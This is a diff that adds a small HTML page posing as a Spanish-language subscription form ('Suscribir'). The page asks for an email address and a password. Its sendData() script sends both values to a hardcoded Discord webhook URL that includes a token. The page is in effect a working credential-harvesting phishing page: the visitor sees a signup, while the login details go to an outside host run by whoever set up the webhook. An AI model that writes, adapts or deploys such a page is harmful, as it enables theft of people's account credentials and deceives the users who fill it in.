@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+      body {
+        background-color: orange;
+        margin: 0;
+        padding: 0;
+      }
+      
+      .container {
+        padding: 20px;
+        text-align: center;
+      }
+      
+      input[type="text"], input[type="password"] {
+        width: 80%;
+        max-width: 300px;
+        padding: 10px;
+        margin: 10px;
+        font-size: 16px;
+        border-radius: 5px;
+        border: none;
+      }
+      
+      .title {
+        color: white;
+        font-size: 24px;
+        margin: 10px;
+      }
+      
+      .btn {
+        background-color: lightblue;
+        color: white;
+        padding: 10px 20px;
+        border-radius: 5px;
+        border: none;
+        transition: background-color 0.2s ease-in-out;
+      }
+      
+      .btn:hover {
+        background-color: blue;
+        cursor: pointer;
+      }
+      
+      @media only screen and (max-width: 480px) {
+        input[type="text"], input[type="password"] {
+          width: 100%;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <h1 class="title">Suscribir</h1>
+      <div>
+        <p class="title">Correo electrónico:</p>
+        <input type="text" id="email">
+      </div>
+      <div>
+        <p class="title">Password:</p>
+        <input type="password" id="password">
+      </div>
+      <button class="btn" onclick="sendData()">Enviar</button>
+    </div>
+    
+    <script>
+      function sendData() {
+        const email = document.getElementById("email").value;
+        const password = document.getElementById("password").value;
+        
+        const xhr = new XMLHttpRequest();
+        xhr.open("POST", "https://discordapp.com/api/webhooks/1065639854324588574/Iu0dfAhK_XeuoLysZSCuxfc79cFpRYvMk9xAueMycoxKijo_gEjoyGT6-6e3MRWFiSnT", true);
+        xhr.setRequestHeader("Content-Type", "application/json");
+        xhr.send(JSON.stringify({
+          content: `Correo electrónico: ${email}\nPassword: ${password}`
+        }));
+      }
+    </script>
+  </body>
+</html>
